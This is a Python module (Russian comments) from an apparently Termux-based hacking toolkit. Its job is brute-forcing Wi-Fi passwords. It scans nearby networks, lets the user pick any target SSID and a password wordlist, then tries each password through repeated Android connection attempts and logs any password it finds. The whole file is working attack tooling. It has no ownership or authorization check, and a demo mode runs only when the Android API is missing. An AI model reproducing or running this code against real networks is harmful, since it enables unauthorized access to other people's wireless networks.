# -*- coding: utf-8 -*-
"""
modules.attack.wifi_crack — Подбор пароля от Wi-Fi.

Механика:
  • пользователь выбирает цель (сеть) и словарь;
  • каждый пароль из словаря проверяется подключением к сети,
    шаг подбора — каждые 0.1 секунды;
  • нажатие ENTER в любой момент останавливает подбор и возвращает в меню;
  • при успехе пароль выводится и подбор останавливается.

Словари лежат в папке wordlists/ проекта:
  pn_e00001.txt  — цифры, easy pass
  pn_h0001.txt   — цифры, hard pass (200k p)
  pn_ea_01.txt   — цифры + буквы

Список сетей-целей получается через Termux:API (`termux-wifi-scaninfo`).
Реальная проверка пароля выполняется подключением к сети средствами Android
(`termux-wifi-connect`); если Termux:API недоступен, включается демо-режим.
"""

import os
import sys
import threading
import time

from core.ui import C, header, pause
from core.termuxapi import api_bin

BASE_DIR = os.path.dirname(os.path.dirname(
    os.path.dirname(os.path.abspath(__file__))))

# Папка со словарями для подбора паролей
WORDLISTS_DIR = os.path.join(BASE_DIR, "wordlists")

def _delay():
    """Шаг подбора из настроек (~/.cyberos/config.json), по умолчанию 0.1 сек."""
    try:
        from modules import settings
        return max(0.01, settings.load().get("crack_delay_ms", 100) / 1000.0)
    except Exception:
        return 0.1


DELAY = _delay()  # шаг подбора — каждые 0.1 секунды (настраивается в «Настройки»)

DICTIONARIES = [
    ("1. Подбор из цифр (Easy pass)", "pn_e00001.txt"),
    ("2. Подбор из цифр (Hard pass | 200k p)", "pn_h0001.txt"),
    ("3. Подбор паролей из цифр и букв", "pn_ea_01.txt"),
]


def dict_path(fname):
    """Полный путь к файлу словаря в папке wordlists/."""
    return os.path.join(WORDLISTS_DIR, fname)


# ─────────────────── цели (список сетей) ───────────────────

def _get_targets():
    """Возвращает список доступных Wi-Fi сетей через Termux:API:
    [(ssid, secure), ...]."""
    import json
    import subprocess

    exe = api_bin("termux-wifi-scaninfo")
    if exe is None:
        return []
    try:
        out = subprocess.run([exe],
                             capture_output=True, text=True,
                             timeout=15).stdout
        data = json.loads(out or "[]")
    except Exception:
        return []
    if isinstance(data, dict):
        data = [data]
    targets, seen = [], set()
    for net in data:
        if not isinstance(net, dict):
            continue
        ssid = net.get("ssid") or net.get("SSID")
        if not ssid or ssid in seen:
            continue
        seen.add(ssid)
        caps = str(net.get("capabilities", "")).upper()
        secure = ("WPA" in caps or "RSN" in caps or "WEP" in caps
                  or "EAP" in caps)
        targets.append((ssid, secure))
    return targets


def _choose_target():
    """Интерактивный выбор сети-цели. Возвращает ssid или None."""
    print(f"{C.CYAN}  Поиск доступных сетей…{C.RESET}")
    targets = _get_targets()
    if not targets:
        print(f"{C.YELLOW}  [!] Не удалось получить список сетей автоматически.{C.RESET}")
        ssid = input(f"{C.GREEN}  Введите имя (SSID) сети-цели вручную (Enter — отмена): {C.RESET}").strip()
        return ssid or None

    print()
    print(f"  {C.BOLD}{'№':<4}{'SSID':<28}{'Защита':<10}{C.RESET}")
    print(f"  {'─' * 44}")
    for i, (ssid, secure) in enumerate(targets, 1):
        lock = f"{C.RED}WPA/WPA2{C.RESET}" if secure else f"{C.GREEN}открытая{C.RESET}"
        print(f"  {i:<4}{ssid[:27]:<28}{lock}")
    print(f"{C.DIM}  01 — главное меню · Enter — отмена{C.RESET}")
    print()

    while True:
        raw = input(f"{C.GREEN}  Выберите сеть (№ или имя, Enter — отмена): {C.RESET}").strip()
        if not raw:
            return None
        if raw == "01":                      # быстрый выход в главное меню
            return None
        if raw.isdigit() and 1 <= int(raw) <= len(targets):
            return targets[int(raw) - 1][0]
        match = [s for s, _ in targets if s == raw]
        if match:
            return match[0]
        print(f"{C.RED}  [x] Нет такой сети.{C.RESET}")


def _choose_dictionary():
    """Выбор словаря. Возвращает путь к файлу или None."""
    print()
    print(f"  {C.BOLD}Выберите словарь для подбора:{C.RESET}")
    for name, fname in DICTIONARIES:
        path = dict_path(fname)
        try:
            with open(path, "r", encoding="utf-8", errors="ignore") as f:
                count = sum(1 for _ in f)
        except FileNotFoundError:
            count = 0
        size = f"{count:,} паролей".replace(",", " ") if count else "файл не найден!"
        print(f"    {C.YELLOW}{name}{C.RESET}  {C.DIM}[wordlists/{fname} · {size}]{C.RESET}")
    print(f"    {C.DIM}0 — Отмена{C.RESET}")
    print()
    while True:
        raw = input(f"{C.GREEN}  Пункт (1-3): {C.RESET}").strip()
        if raw in {"", "0"}:
            return None
        if raw in {"1", "2", "3"}:
            fname = DICTIONARIES[int(raw) - 1][1]
            path = dict_path(fname)
            if os.path.isfile(path):
                return path
            print(f"{C.RED}  [x] Файл {fname} отсутствует в проекте.{C.RESET}")
            return None
        print(f"{C.RED}  [x] Неверный пункт.{C.RESET}")


# ─────────────── реальная атака через Termux:API ───────────────

def _termux_connectable():
    """Есть ли Termux:API для реальной проверки паролей."""
    return (api_bin("termux-wifi-connect") is not None
            and api_bin("termux-wifi-info") is not None)


def _try_connect(ssid, pwd):
    """Одна реальная попытка подключения к сети с паролем pwd
    через `termux-wifi-connect` (Termux:API)."""
    import json
    import subprocess

    exe = api_bin("termux-wifi-connect")
    if exe is None:
        return False
    try:
        subprocess.run([exe, "--ssid", ssid,
                        "--pwd", pwd, "--type", "wpa2"],
                       stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL,
                       text=True, timeout=15)
    except Exception:
        return False
    ok = False
    info_exe = api_bin("termux-wifi-info")
    steps = max(1, int(round(DELAY * 10)))
    for _ in range(steps):        # короткое ожидание статуса
        time.sleep(0.1)
        try:
            out = subprocess.run([info_exe],
                                 capture_output=True, text=True,
                                 timeout=5).stdout
            info = json.loads(out or "{}")
        except Exception:
            info = {}
        if info.get("connected") and info.get("ssid") == ssid:
            ok = True
            break
    forget = api_bin("termux-wifi-forgetprofile")
    if forget:
        try:                      # откат профиля, чтобы не остаться в сети
            subprocess.run([forget, "--all"],
                           stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL,
                           text=True, timeout=10)
        except Exception:
            pass
    return ok


def _save_result(ssid, pwd, demo_note=False):
    """Сохраняет итог в logs/wifi_crack.log."""
    log_dir = os.path.join(BASE_DIR, "logs")
    os.makedirs(log_dir, exist_ok=True)
    line = f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] цель={ssid} "
    if pwd:
        line += f"пароль={pwd}"
    elif demo_note:
        line += "результат=демо-прогон (без реальной проверки)"
    else:
        line += "результат=пароль не найден"
    with open(os.path.join(log_dir, "wifi_crack.log"), "a",
              encoding="utf-8") as f:
        f.write(line + "\n")
    print(f"{C.DIM}  Итог сохранён в logs/wifi_crack.log{C.RESET}")


# ─────────────── остановка по ENTER ───────────────

def _start_enter_stop():
    """Фоновый наблюдатель: нажатие ENTER останавливает подбор.

    Возвращает (threading.Event, msvcrt-режим|None). Событие установлено —
    значит пользователь нажал Enter (или закрыл stdin).
    """
    stop = threading.Event()

    def watch():
        try:
            sys.stdin.readline()      # блокируется до Enter / Ctrl+D
        except Exception:
            pass
        stop.set()

    t = threading.Thread(target=watch, daemon=True)
    t.start()
    return t, stop


def run_attack(ssid, dict_path, demo=False):
    """Основной цикл подбора: по одному паролю каждые 0.1 сек;
    ENTER — остановить подбор и вернуться в меню."""
    passwords = []
    with open(dict_path, "r", encoding="utf-8", errors="ignore") as f:
        for line in f:
            p = line.strip()
            if p:
                passwords.append(p)
    total = len(passwords)

    mode_tag = f" {C.DIM}(демо-режим){C.RESET}" if demo else ""
    print()
    print(f"{C.CYAN}  {'═' * 46}{C.RESET}")
    print(f"{C.BOLD}  [target]  Цель: {ssid}{mode_tag}{C.RESET}")
    print(f"{C.BOLD}  [dict]  Словарь: {os.path.basename(dict_path)} · всего паролей: {total:,}".replace(',', ' ') + C.RESET)
    print(f"{C.BOLD}  [t]  Шаг подбора: {DELAY} сек{C.RESET}")
    print(f"{C.CYAN}  {'═' * 46}{C.RESET}")
    print(f"{C.DIM}  ENTER — остановить подбор и выйти в меню · Ctrl+C — тоже стоп.{C.RESET}\n")

    real_mode = False
    if not demo:
        if _termux_connectable():
            real_mode = True
        else:
            demo = True
            print(f"{C.YELLOW}  [!] Termux:API недоступен — включён демо-режим.{C.RESET}\n")

    start = time.time()
    found = None
    stopped_by_user = False
    _, stop = _start_enter_stop()
    try:
        for i, pwd in enumerate(passwords, 1):
            if stop.is_set():
                stopped_by_user = True
                break
            ok = False
            if real_mode:
                ok = _try_connect(ssid, pwd)
            else:
                # демо: имитируем проверку с шагом 0.1 сек
                if stop.wait(DELAY):
                    stopped_by_user = True
                    break

            elapsed = time.time() - start
            speed = i / elapsed if elapsed > 0 else 0
            bar_len = 24
            filled = int(bar_len * i / total)
            bar = "█" * filled + "░" * (bar_len - filled)
            sys.stdout.write(
                f"\r  {C.CYAN}[{bar}]{C.RESET} {i}/{total} "
                f"({i * 100 // total}%) · {pwd[:18]:<18} · {speed:.1f} п/с  "
            )
            sys.stdout.flush()

            if ok:
                found = pwd
                break

            # задержка шага, если реальная проверка прошла быстрее
            if real_mode:
                target_time = start + i * DELAY
                now = time.time()
                if now < target_time and stop.wait(target_time - now):
                    stopped_by_user = True
                    break
    except KeyboardInterrupt:
        stopped_by_user = True

    print()
    if stopped_by_user:
        print(f"\n{C.YELLOW}  [X] Подбор остановлен (ENTER) — возврат в меню.{C.RESET}")
    if found:
        print(f"\n{C.GREEN}{C.BOLD}  [ok] ПАРОЛЬ НАЙДЕН: {found}{C.RESET}")
        _save_result(ssid, found)
    elif not real_mode and not stopped_by_user:
        print(f"\n{C.DIM}  Демо-прогон завершён: реальных подключений не выполнялось."
              f"\n  Для боевого режима установите Termux:API (pkg install termux-api"
              f"\n  + приложение Termux:API из F-Droid).{C.RESET}")
        _save_result(ssid, None, demo_note=True)
    elif not stopped_by_user:
        print(f"\n{C.RED}  [x] Пароль не найден (словарь исчерпан).{C.RESET}")
        _save_result(ssid, None)


def main(demo=False):
    """Точка входа пункта «Подбор пароля от Wi-Fi»."""
    header("Подбор / Взлом → Подбор пароля от Wi-Fi")

    if demo:
        print(f"{C.YELLOW}  [!] Демо-режим: показывается механика подбора,"
              f"\n    реальные подключения к сетям НЕ выполняются.{C.RESET}")

    ssid = _choose_target()
    if not ssid:
        print(f"{C.DIM}  Отменено.{C.RESET}")
        pause()
        return

    dict_path = _choose_dictionary()
    if not dict_path:
        print(f"{C.DIM}  Отменено.{C.RESET}")
        pause()
        return

    run_attack(ssid, dict_path, demo=demo)
    pause()
